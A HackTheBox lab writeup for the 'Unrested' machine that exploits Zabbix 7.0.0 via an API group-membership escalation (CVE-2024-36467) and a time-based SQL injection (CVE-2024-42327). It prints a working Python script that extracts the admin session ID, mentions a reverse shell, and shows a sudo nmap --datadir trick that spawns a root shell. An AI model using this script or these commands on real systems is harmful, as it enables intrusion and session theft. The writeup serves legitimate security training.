---
title: Unrested HTB Writeup
date: 2025-01-21 13:15:00 +0530
categories: [Machine, HTB]
tags: [HTB, SQL Injection, Source code review ,CVE-2024-42327  ,CVE-2024-36467, Sudo Exploitation]
render_with_liquid: false
---


## About Unrested
Unrested is a medium difficulty `Linux` machine hosting a version of `Zabbix`. Enumerating the version of `Zabbix` shows that it is vulnerable to both [CVE-2024-36467](https://nvd.nist.gov/vuln/detail/CVE-2024-36467) (missing access controls on the `user.update` function within the `CUser` class) and [CVE-2024-42327](https://nvd.nist.gov/vuln/detail/CVE-2024-42327) (SQL injection in `user.get` function in `CUser` class) which is leveraged to gain user access on the target. Post-exploitation enumeration reveals that the system has a `sudo` misconfiguration allowing the `zabbix` user to execute `sudo /usr/bin/nmap`, an optional dependency in `Zabbix` servers that is leveraged to gain `root` access.

### Enumeration
Start with a simple ping request to see if the target will response to it.
```bash
┌──(kratos㉿Hydra)-[~/Documents/HTB/TwoMillion]
└─$ ping $ip -c3
PING 10.10.11.50 (10.10.11.50) 56(84) bytes of data.
64 bytes from 10.10.11.50: icmp_seq=1 ttl=62 time=301 ms
64 bytes from 10.10.11.50: icmp_seq=2 ttl=62 time=312 ms
64 bytes from 10.10.11.50: icmp_seq=3 ttl=62 time=303 ms

--- 10.10.11.50 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 301.459/305.696/312.358/4.768 ms
```
The target does response. Next we should discover what ports are open and what services are running on them.
```bash
┌──(kratos㉿Hydra)-[~/Documents/HTB/TwoMillion]
└─$ nmap $ip -p- 
<snip>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.60 seconds
```
The scan reveals `SSH` and `Apache2` are open on their respective default ports. Ports `10050` and `10051` are associated with 
`Zabbix agents`. Visiting the target IP on port 10050 and  80 redirects us to a `Zabbix` login page

### What is Zabbix 
Zabbix is like a digital watchdog for computers and networks. Think of it as a tool that helps IT professionals make sure everything is running smoothly. It collects data and shows it in an easy-to-understand way, helping teams maintain and improve their IT systems.


![Zabbix Login Page](https://threatninja.net/wp-content/uploads/2024/12/word-image-22055-1.png)

Using the provided credentials, we can authenticate as matthew and access the Zabbix dashboard. This account is in the default User role with no additional groups or privileges. At the bottom of the page, we see the Zabbix version of 7.0.0 

![Zabbix Dashboard](https://camo.githubusercontent.com/ba97b4c07d16865db7ef5f81c4d20c3a5b2b72055d15e9bd47c7c556ef11aae7/68747470733a2f2f6861636b6d642d70726f642d696d616765732e73332d61702d6e6f727468656173742d312e616d617a6f6e6177732e636f6d2f75706c6f6164732f75706c6f61645f33653436363566346464636437333663623566346263306263326533633031342e706e673f4157534163636573734b657949643d414b4941335853414157364157534b4e494e574f26457870697265733d31373337343436313936265369676e61747572653d70315a79386b556e347a69253242387a58575872694a78326e536d3649253344)

The Zabbix version can be seen as 7.0.0. 

![Zabbix Version](https://camo.githubusercontent.com/cf98140124c3c8b937de04d766c5c1d7ebd0dcbc63201b92d905397157ac159a/68747470733a2f2f6861636b6d642d70726f642d696d616765732e73332d61702d6e6f727468656173742d312e616d617a6f6e6177732e636f6d2f75706c6f6164732f75706c6f61645f39633066323237666638353762303362363462316337313664313034613462642e706e673f4157534163636573734b657949643d414b4941335853414157364157534b4e494e574f26457870697265733d31373337343436323230265369676e61747572653d594a73584a324244686c7179394b2532427a39497973766442557a6777253344)

Searching the web gives us two vulnerabilities. `CVE-2024-36467` and `CVE-2024-42327`.

### Overview of CVE-2024-36467
CVE-2024-36467 is a security flaw in Zabbix, a software used for monitoring computer systems. This flaw allows someone who is already logged into the system and has access to the system’s API (a kind of digital toolkit) to change their group membership.

#### Zabbix API Abuse

**Authenticated User with API Access:**
An authenticated user can interact with the system using the API, enabling actions that are restricted through the standard web interface.

**User Role and Permissions:**
Zabbix roles come with specific access levels.

**API Endpoint:** `user.update` :
The `user.update` endpoint lets a user modify their details, including group memberships.

#### Privilege Escalation:
By adding themselves to high-privilege groups like “Zabbix Administrators,” the user can escalate their access, gaining control over sensitive system functions and compromising its security.


Let’s refer to the [Zabbix website documentation](https://www.zabbix.com/documentation/current/en/manual/api) to gather more information. 

![Zabbix API](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_e01c4002a8ff7c5e8c57a03dc6c204d6.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1737446437&Signature=geRWWyk1E1ZgU6ajTvq4yuqIHjE%3D)

Lets check the `api_jsonrpc.php` in our target.

![Zabbix api](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_c9e6fb2b450a5cfe5890ffddb41b4766.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1737446449&Signature=cVv%2F8sZ1WGuBGv2NQldwyW%2B2UHc%3D)

#### `api_jsonrpc` Request Format

The request must have the `Content-Type header` set to one of these values: `application/json-rpc`, `application/json` or `application/jsonrequest`.

**The request object contains the following properties:**

* `jsonrpc` - the version of the JSON-RPC protocol used by the API (Zabbix API implements JSON-RPC version 2.0);
* `method` - the API method being called;
* `params` - the parameters that will be passed to the API method;
* `id` - an arbitrary identifier of the request.

To carry out the exploitation, we begin by authenticating the API with user credentials, which returns an API key as a response.

![Zabbix API Burpsuite](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_50cd7677b6857f18aac16528ad482bb4.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1737446477&Signature=HUKSxH6b7Q0MaOjXItuSysipVdY%3D)

Successfully got a API token. Before we try `user.update` to update our roles, let’s try to find our userid. Bruteforcing the userids also work but we can see every user id using user.get function. Using the `selectRole` or `SelectUsrgrps` as params returns the userlist and scrolling down, we can see `matthew` user as `userid:3`.

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_2426d11738394caf81a2fef06aa3d0ab.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1737446488&Signature=c%2FX7mzXduzu8MnOT8xLqVWP12Rg%3D)

From the json response we can also see that Administrator role is roleid:3 and matthew user has roleid:1 which is probably the default user id. Let’s try to set our roleid to Administrator. But we get the following error.

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_9f627ca214f018bebda7318aba14591a.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1737446499&Signature=3tmgm%2BGJx9v%2FilNwHccPmQNoxcQ%3D)
So it seems that we can’t change our role beacuse in CUser.php file, validateUpdate() and checkHimself() functions checks if its our own role or not. But we also see that in user.update, we can change our usrgroup which doesn’t have any validation placed.

We also need to find a valid “usrgrpid” to make us Administrator. Luckily, i have seen Zabbix Administrators id in the manual page as 7. This is crucial beacause it saves time from bruteforcing all the group ids.

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_1fd3dd3f89de8362d5525c854819b23d.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1737446515&Signature=vpZRgqUQwjLg969oLPngxhmDpfY%3D)

Now that we have the group id, let’s add our user to `Zabbix Administrators` using `user.update`.

Note that without this privilege escalation, we can’t perform the SQL injection in the upcoming part.

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_b20cee3cfe32d4a063bbf01afb107caa.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1737446523&Signature=CKfhXjZkG4sOMC9YRt4YoDwEnBE%3D)

### Overview of CVE-2024-42327

CVE-2024–42327 is a vulnerability where attacker can perform an SQL injection in user.get function in CUser.php class which can be used to leak database content.

Using the following request, we can see that request took 6,408 ms which means our SLEEP(5) payload resulted with time-based sql injection.

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_8994a1cd97035468112cb6db518cc776.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1737446531&Signature=cwciCW5Avr8r2aEjhwzXX9caRGg%3D)

Lets do automated scan since it would take a long time to do it manually. Replace the sqli payload with `*` and copy the request to a file. Then dump the database using sqlmap.

```
<SNIP> 
available databases [2]:
 [*] information_schema
 [*] zabbix
```
From the output, we have successfully retrieved the database names by exploiting the based SQL injection.

From both methods, we can utilize misconfigured agents to gain remote code execution. To do this from the time-based SQL injection, we must leak the sessions table in the database to see if the Admin user has authenticated at all.

Unfortunately due to being a time-based attack, this can take a while, so I have included a quicker script(Its not created by me! Credit goes to the orginal owner) for further use.

```python
import requests
import json
from datetime import datetime
import string
import random
import sys
from concurrent.futures import ThreadPoolExecutor

URL = "http://10.129.231.176/zabbix/api_jsonrpc.php"
TRUE_TIME = 1
ROW = 0
USERNAME = "matthew"
PASSWORD = "96qzn0h2e1k3"

def authenticate():
    payload = {
        "jsonrpc": "2.0",
        "method": "user.login",
        "params": {
            "username": USERNAME,
            "password": PASSWORD
        },
        "id": 1
    }
    response = requests.post(URL, json=payload)
    if response.status_code == 200:
        try:
            response_json = response.json()
            auth_token = response_json.get("result")
            if auth_token:
                print(f"Login successful! Auth token: {auth_token}")
                return auth_token
            else:
                print(f"Login failed. Response: {response_json}")
        except Exception as e:
            print(f"Error: {str(e)}")
    else:
        print(f"HTTP request failed with status code {response.status_code}")
    return None

def send_injection(auth_token, position, char):
    payload = {
        "jsonrpc": "2.0",
        "method": "user.get",
        "params": {
            "output": ["userid", "username"],
            "selectRole": [
                "roleid",
                f"name AND (SELECT * FROM (SELECT(SLEEP({TRUE_TIME} * "
                f"(IF(ORD(MID((SELECT sessionid FROM zabbix.sessions WHERE userid=1 and status=0 "
                f"LIMIT {ROW},1), {position}, 1))={ord(char)}, 0, {TRUE_TIME}))))BEEF)"
            ],
            "editable": 1,
        },
        "auth": auth_token,
        "id": 1
    }
    before_query = datetime.now().timestamp()
    response = requests.post(URL, json=payload)
    after_query = datetime.now().timestamp()
    response_time = after_query - before_query
    return char, response_time

def test_characters_parallel(auth_token, position):
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(send_injection, auth_token, position, char): char for char in string.printable}
        for future in futures:
            char, response_time = future.result()
            if TRUE_TIME - 0.5 < response_time < TRUE_TIME + 0.5:
                return char
    return None

def print_progress(extracted_value):
    sys.stdout.write(f"\rExtracting admin session: {extracted_value}")
    sys.stdout.flush()

def extract_admin_session_parallel(auth_token):
    extracted_value = ""
    max_length = 32
    for position in range(1, max_length + 1):
        char = test_characters_parallel(auth_token, position)
        if char:
            extracted_value += char
            print_progress(extracted_value)
        else:
            print(f"\n(-) No character found at position {position}, stopping.")
            break
    return extracted_value

if __name__ == "__main__":
    print("Authenticating...")
    auth_token = authenticate()
    if auth_token:
        print("Starting data extraction...")
        admin_session = extract_admin_session_parallel(auth_token)
        print(f"\nAdmin session extracted: {admin_session}")
    else:
        print("Authentication failed.")
```

After running the script, we see we successfully obtained the admin session in just less than a minute.

Now that we have admin session, using our privileges we can get Remote Code Execution

Hosting a simple reverse shell on port 8000 and using the command below, returns a connection.

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_ebe092a33cf4ba9a9b87c665611c5416.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1737446543&Signature=mJKX48VEgGjxkh%2BE1%2Bpdzg%2BfJgA%3D)

```
$nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.50] 40504
bash: cannot set terminal process group (3689): Inappropriate ioctl for device
bash: no job control in this shell
zabbix@unrested:/$
```

We can get the user flag from `/home/matthew/user.txt`

### Privilege Escalation

As zabbix user we check if we can execute any applications with sudo permissions.

``` 
 zabbix@unrested:/$ sudo -l
 sudo -l
 Matching Defaults entries for zabbix on unrested:
 env_reset, mail_badpass,
 secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/
 snap/bin,
 use_pty
 User zabbix may run the following commands on unrested:
 (ALL : ALL) NOPASSWD: /usr/bin/nmap *
```  
We see that we can run `/usr/bin/nmap` unrestricted. We attempt to use the GTFOBins.

```
 zabbix@unrested:/$ TF=$(mktemp)
 zabbix@unrested:/$ echo 'os.execute("/bin/sh")' > $TF
 zabbix@unrested:/$ sudo nmap --script=$TF
 Script mode is disabled for security reasons.
 zabbix@unrested:/$
```

Seems that this is just a nmap wrapper program. We try to read the source code of `/usr/bin/nmap`

```bash
zabbix@unrested:/tmp$ cat /usr/bin/nmap
#!/bin/bash

#################################
## Restrictive nmap for Zabbix ##
#################################

# List of restricted options and corresponding error messages
declare -A RESTRICTED_OPTIONS=(
    ["--interactive"]="Interactive mode is disabled for security reasons."
    ["--script"]="Script mode is disabled for security reasons."
    ["-oG"]="Scan outputs in Greppable format are disabled for security reasons."
    ["-iL"]="File input mode is disabled for security reasons."
)

# Check if any restricted options are used
for option in "${!RESTRICTED_OPTIONS[@]}"; do
    if [[ "$*" == *"$option"* ]]; then
        echo "${RESTRICTED_OPTIONS[$option]}"
        exit 1
    fi
done

# Execute the original nmap binary with the provided arguments
exec /usr/bin/nmap.original "$@"
zabbix@unrested:/tmp$
```
It seems that the maintainers of the server were aware of the known privilege escalations that can 
happen with nmap . All the GTFOBins escapes are useless in this scenario. Reading through the options we discover the `--datadir` option. `--datadir <dirname>`: Specify custom Nmap data file location

This option allows you to specify a data directory where default scripts and other are stored, the default in this case is `/usr/share/nmap`.

The `nse_main.lua` file is the default script file that can be triggered with `-sC` . To exploit this, we create a new file in  `/tmp/nse_main.lua` with `os.execute("chmod 4755 /bin/bash")` . When we scan localhost with` -sC` enabled, we set effective UID of root user.

```
zabbix@unrested:/tmp$ echo 'os.execute("/bin/bash -p")' > nse_main.lua
zabbix@unrested:/tmp$ sudo /usr/bin/nmap -sC --datadir=/tmp
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-15 19:43 UTC
id
uid=0(root) gid=0(root) groups=0(root)
```
Finally, we can read the flag in `/root/root.txt`.
